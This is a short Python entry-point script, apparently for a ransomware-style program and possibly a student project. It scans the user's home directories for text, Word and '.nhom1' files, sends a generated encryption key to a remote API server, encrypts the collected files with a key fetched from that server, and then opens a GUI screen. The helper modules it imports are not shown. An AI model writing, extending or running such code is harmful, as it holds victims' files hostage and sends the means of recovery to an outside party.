from screens.home_screen import HomeScreen
from services.get_dirs import GetDirs
from services.get_files import GetFiles
from services.api_services import ApiService
from encrypt.encrypt_file import * 


all_dirs = GetDirs().get_home_dirs()
get_files = GetFiles(my_dir=all_dirs[0])
all_txt_files = get_files.get_txt_files()
all_docx_files =get_files.get_docx_files()
all_nhom1_files = get_files.get_nhom1_files()

# api to connect data retool
api_service = ApiService()
node = api_service.get_node()
enc = Encrypt()

# get key from data
key = api_service.get_key(node=node)

if key == 'NA':
  key = enc.get_key()
  status = api_service.post_key(node=node, key=key)
  print(status)
else:
  for f in all_nhom1_files:
    enc.enc(filename=f, key=key)

home_screen = HomeScreen()
home_screen.mainloop()